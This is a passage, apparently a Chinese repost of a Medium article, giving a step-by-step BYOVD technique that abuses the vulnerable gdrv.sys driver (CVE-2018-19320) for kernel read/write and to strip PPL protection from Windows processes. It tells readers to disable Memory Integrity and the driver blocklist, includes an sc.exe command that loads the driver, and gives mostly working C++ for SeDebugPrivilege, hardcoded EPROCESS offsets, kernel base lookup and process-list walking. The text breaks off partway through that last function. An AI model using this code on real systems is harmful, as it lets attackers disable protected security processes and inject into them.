---
title: 滥用漏洞驱动 (BYOVD) 实现任意内核读写并绕过 PPL 保护
url: https://mp.weixin.qq.com/s/krfaBaXqzjFMAX-pEQJIlw
source: Doonsec's feed
date: 2026-03-21
fetch_date: 2026-03-22T04:13:03.968623
---

# 滥用漏洞驱动 (BYOVD) 实现任意内核读写并绕过 PPL 保护

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/h4gtbB74nSj7dsib5n3iaVSWKqwdQyHHGegelNF480NeiaHRFIktm6dYSdDKuzkR5PTdv5l4yFhOLTnr4VtUpHVQN230iblUJCjdNcYBTLPksbA/0?wx_fmt=jpeg)

# 滥用漏洞驱动 (BYOVD) 实现任意内核读写并绕过 PPL 保护

S12
S12

securitainment

![]()

在小说阅读器中沉浸阅读

| 原文链接 | 作者 |
| --- | --- |
| https://medium.com/@s12deff/abusing-a-vulnerable-driver-byovd-to-gain-arbitrary-kernel-r-w-and-bypass-ppl-protection-571552c7efc8 | S12 |

欢迎阅读这篇 Medium 文章。本文将介绍一种攻击性安全领域中的强大技术——通过滥用存在漏洞的驱动程序来绕过 Protected Process Light (PPL) 保护机制。

该技术的核心思路非常简单：我们不直接利用内核漏洞，而是向系统加载一个合法但存在漏洞的驱动程序。该驱动程序为我们提供了在内核空间进行内存读写的能力。

有了这些任意内核读/写原语之后，我们就可以修改操作系统中的关键结构。在本文中，我们将利用它们来禁用目标进程的 PPL 保护，从而能够与这些进程自由交互。

以下是一系列关于 PPL 保护的讨论与实践文章：

Windows PPL Evasion - Medium List

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiakpnibHDWagEFnibPt1VXOmGic90yBmkcs43UzwZfmgfGsHickkpvCdhZbfQkXaFTicqNTQupkjkTabDpRqFGzJJvzyKHRqiaia1nohE/640?wx_fmt=png&from=appmsg)

## 方法论

在查看完整代码之前，我们先梳理整体逻辑。这有助于在动手实现之前理解整个 **流程**。

要通过具备任意内核读/写能力的 BYOVD 实现 **PPL 绕过**，需要依次完成以下步骤：

### 步骤 1：加载存在漏洞的驱动程序

首先，我们需要在系统中加载并启动存在漏洞的驱动程序。这是整个技术的核心，因为它通过暴露的 IOCTL 或不安全的功能为我们提供了对内核内存的访问能力。

### 步骤 2：启用所需权限

驱动程序加载完成后，我们需要为当前进程启用 **SeDebugPrivilege**。这一步非常重要，因为它允许我们无限制地与受保护的系统进程进行交互。

### 步骤 3：解析内核信息

接下来，我们需要收集关键的内核信息，包括：

* 获取 **ntoskrnl.exe**的基地址
* 识别重要的结构偏移量 (通常针对目标操作系统版本进行硬编码)

这一步至关重要，因为我们需要精确的内存位置才能安全地执行内核读/写操作。

### 步骤 4：定位目标进程 (EPROCESS)

获得内核基地址和偏移量之后，我们需要定位目标进程的 **EPROCESS**结构。这很重要，因为 PPL 保护正是通过该结构中的字段来实施的。

### 步骤 5：修改保护 (禁用 PPL)

借助任意内核读/写能力和目标进程的 EPROCESS，我们可以直接修改保护相关的字段。将这些值清零后，即可有效禁用目标进程的 PPL 保护，实现完全访问。

### 最终状态

至此，目标进程不再受 PPL 保护，我们可以自由地与其交互 (例如打开句柄、读写内存、注入代码等)。

```
Userland Process
        │
        ▼
Load Vulnerable Driver (BYOVD)
        │
        ▼
Gain Kernel R/W
        │
        ▼
Locate ntoskrnl + EPROCESS
        │
        ▼
Modify Protection Fields
        │
        ▼
PPL Disabled
```

## 实现

现在，让我们看看如何将上述逻辑转化为 C++ 代码。以下是最关键部分的分解说明。

### 加载存在漏洞的驱动程序

本文使用的是与前一篇文章中相同的易受攻击的驱动程序——名为 **GDRV**的驱动，该驱动存在 **CVE-2018-19320**漏洞。

可以直接从 **LolDrivers**网站下载该驱动程序，链接如下：

gdrv.sys - LolDrivers

要加载此驱动程序，你需要禁用 **Windows Memory Integrity**和 **Microsoft Vulnerable Driver Blocklist**，这两项均属于 **Kernel Isolation**安全功能的一部分 (或者使用一个未被列入黑名单的驱动程序)。

加载驱动程序时，你可以使用 C++ 代码，也可以仅用于测试目的，在管理员权限的 CMD 中运行以下命令：

```
sc.exe create gdrv.sys binPath=C:\windows\temp\gdrv.sys type=kernel && sc.exe start gdrv.sys
```

### 启用所需权限

用于获取 **SeDebugPrivilege**的代码是以下这个经典实现，因此你需要 **管理员权限**才能运行该程序：

```
BOOL EnableSeDebugPrivilege(){
 HANDLE hToken;
 TOKEN_PRIVILEGES tp;
 LUID luid;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 {
  std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
returnFALSE;
 }
if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
 {
  std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
CloseHandle(hToken);
returnFALSE;
 }
 tp.PrivilegeCount = 1;
 tp.Privileges[0].Luid = luid;
 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
 {
  std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
CloseHandle(hToken);
returnFALSE;
 }
CloseHandle(hToken);
returnTRUE;
}
```

### 解析内核信息

接下来我们需要解析两项不同的信息：

1. **内核偏移量**
2. **ntoskrnl.exe 基地址**

先从 **内核偏移量**开始：

在我们的案例中直接使用了硬编码的值。在实际生产环境中，你需要通过在线符号引用来动态解析这些信息，或者在项目中为所有 Windows 版本硬编码所需的偏移量。

在我的环境中，硬编码的偏移量如下：

```
structoffsets {
 ULONG64 ActiveProcessLinks;
 ULONG64 UniqueProcessId;
 ULONG64 Protection;
 ULONG64 PsLoadedModuleList;
 ULONG64 PsInitialSystemProcess;
} g_offsets = {
0x1d8, // ActiveProcessLinks (Inspect the dt nt!_EPROCESS)
0x1d0, // UniqueProcessId (Inspect the dt nt!_EPROCESS)
0x5fa, // Protection (Inspect the dt nt!_EPROCESS)
0xEF50C0, // PsLoadedModuleList (ntoskrnl.exe base address - PsLoadedModuleList = ? nt!PsLoadedModuleList - nt)
0xFC5ab0// PsInitialSystemProcess (ntoskrnl.exe base address - PsInitialSystemProcess = ? nt!PsInitialSystemProcess - nt)
};
```

在前一篇文章中有关于如何从 **EPROCESS**获取偏移量的更多信息。

现在，让我们来 **获取 ntoskrnl.exe 的基地址：**

为此，我们只需要列出所有已加载的驱动程序，找到 **ntoskrnl.exe**并获取其基地址：

**列出驱动程序：**

```
std::vector<KernelDriver> GetSortedKernelDrivers() {
 std::vector<KernelDriver> driverList;

auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

if (!NtQuerySystemInformation) return driverList;

 ULONG len = 0;
constint SystemModuleInformation = 11;

NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &len);

 std::vector<BYTE> buffer(len);
 NTSTATUS status = NtQuerySystemInformation(
  (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
  buffer.data(),
  len,
  &len
 );

if (status != 0) return driverList; // STATUS_SUCCESS = 0

auto mods = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.data());

for (ULONG i = 0; i < mods->Count; i++) {
  SYSTEM_MODULE_ENTRY& entry = mods->Modules[i];

  KernelDriver drv;
  drv.BaseAddress = reinterpret_cast<uintptr_t>(entry.ImageBase);
  drv.Size = entry.ImageSize;

constchar* nameStart = reinterpret_cast<constchar*>(entry.FullPathName) + entry.OffsetToFileName;
  drv.Name = std::string(nameStart);

  driverList.push_back(drv);
 }

std::sort(driverList.begin(), driverList.end(), [](const KernelDriver& a, const KernelDriver& b) {
return a.BaseAddress < b.BaseAddress;
  });

return driverList;
}
```

该函数使用 `NtQuerySystemInformation`获取所有已加载内核驱动程序的列表，将它们的基地址、大小和名称提取到一个 vector 中。最后按基地址排序，这对于定位 **ntoskrnl.exe**模块非常有用。

然后我们只需将驱动程序列表传入以下函数：

```
DWORD64 GetNtoskrnlBase(const std::vector<KernelDriver>& drivers) {
if (drivers.empty()) {
return0;
 }

for (constauto& drv : drivers) {
  std::string nameLower = drv.Name;
std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);

if (nameLower.find("ntoskrnl.exe") != std::string::npos ||
   nameLower.find("ntkrnl") != std::string::npos) {
return (DWORD64)drv.BaseAddress;
  }
 }

return0;
}
```

该函数遍历驱动程序列表，查找 **ntoskrnl.exe**(或 **ntkrnl**)，找到后返回其基地址。

### 定位目标进程 (EPROCESS)

然后我们调用 getEPROCESS 函数，传入 **易受攻击驱动程序**的句柄、**ntoskrnl.exe**的 **基地址**以及 **目标进程 ID**。

```
DWORD64 eprocess = getEPROCESS(drv, ntoskrnlBase, pid);
```

在该函数内部，我们执行以下步骤：

1. 通过 `PsInitialSystemProcess`获取 System 进程 (PID 4) 的 **EPROCESS**结构
2. 利用 `ActiveProcessLinks`字段访问进程链表
3. 通过 **Flink (前向链接)**遍历链表，逐个移动到下一个 EPROCESS
4. 重复此过程直到找到目标 PID

该函数之所以有效，是因为 Windows 中所有 **EPROCESS**结构都通过 `ActiveProcessLinks`字段以双向链表的形式连接在一起。我们从 **System 进程 (PID 4)**开始遍历，因为它始终可以通过 `PsInitialSystemProcess`访问。沿着 **Flink (前向链接)**指针，我们可以从一个进程移动到下一个进程。

```
DWORD64 getEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, DWORD pid)
{
if (ntoskrnlBase == 0)
 {
  std::cerr << "Failed to find ntoskrnl.exe base address." << std::endl;
return0;
 }

 DWORD64 initialSystemProcess = ntoskrnlBase + g_offsets.PsInitialSystemProcess;  // Get EPROCESS of the System process (PID 4)
 cout << "PsInitialSystemProcess address " << initialSystemProcess << endl;

getchar();
// Open Driver

getchar();
// Read Primitive to get EPROCESS structure from System Process
 DWORD64 systemEPROCESS = 0;
 BOOL readResult = ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)initialSystemProcess, sizeof(DWORD64));
 cout << "System EPROCESS: " << systemEPROCESS << endl;

// Make sure that the EPROCESS is not from the PID 4 (System)
 DWORD systemPid = 0;
 BOOL readPIDSystemResult = ReadPrimitive(drv, &systemPid, (LPVOID)(uintptr_t)(systemEPROCESS + g_offsets.UniqueProcessId), sizeof(DWORD));
 cout << "System PID: " << systemPid << endl;
if (systemPid == pid) {
return systemEPROCESS; // If the target process is SYSTEM (PID 4) we already have it
 }

// Walk through the whole list
 DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
 cout << "headList address :" << headList << endl;

// Get first process
 DWORD64 firstProcess = 0;
 BOOL readFirstResult = ReadPrimitive(drv, &firstProcess, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));
if (!readFirstResult) {
  cout << "Failed ...